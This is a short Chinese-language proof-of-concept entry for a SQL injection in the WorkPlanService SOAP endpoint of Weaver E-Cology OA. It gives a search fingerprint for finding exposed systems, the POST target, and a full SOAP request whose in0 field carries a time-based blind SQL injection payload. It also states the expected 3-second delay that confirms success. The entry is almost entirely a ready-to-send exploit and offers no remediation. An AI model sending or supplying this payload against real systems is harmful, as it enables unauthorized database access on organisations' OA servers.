# 泛微E-Cology系统接口WorkPlanService存在SQL注入漏洞

- **系统**：泛微OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="泛微-OA（e-cology）"`
- **请求**：`POST /services/WorkPlanService HTTP/1.1`
- **关键头**：`Host: example.com`　`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">
<soapenv:Header/>
<soapenv:Body>
<web:deleteWorkPlan>
<!--type: string-->
<web:in0>(SELECT 8544 FROM(SELECT(SLEEP(3-(IF(27=27,0,5)))))NZeo)</web:in0>
<!--type: int-->
<web:in1>22</web:in1>
</web:deleteWorkPlan>
</soapenv:Body>
</soapenv:Envelope>
POST /services/WorkPlanService HTTP/1.1
Content-Length: 430
SOAPAction:
Content-Type: text/xml;charset=UTF-8
Host:
Cookie: ecology_JSessionid=aaawzto5mqug94J9Fz0cz
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/…（脚本共 890 字，完整版见原文）
```
- **预期**：200　|　响应时间>=3s